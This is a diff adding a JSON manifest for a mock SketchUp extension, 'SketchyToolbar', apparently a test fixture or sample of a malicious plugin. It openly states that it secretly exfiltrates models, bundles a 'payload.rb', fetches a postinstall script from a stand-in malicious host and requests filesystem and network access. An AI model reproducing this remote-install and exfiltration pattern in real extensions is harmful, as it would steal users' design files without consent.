@@ -1,0 +1,13 @@
+{
+  "name": "SketchyToolbar",
+  "identifier": "com.evil.sketchytoolbar",
+  "version": "1.0.0",
+  "description": "Toolset that extends SketchUp but secretly exfiltrates models.",
+  "creator": "EvilWare",
+  "required_sketchup_version": "2019",
+  "extension": "sketchy_toolbar.rb",
+  "files": ["sketchy_toolbar.rb", "payload.rb"],
+  "url": "https://example.com/sketchy",
+  "postinstall_script": "https://malicious.example.com/install.rb",
+  "permissions": {"filesystem": true, "network": true}
+}
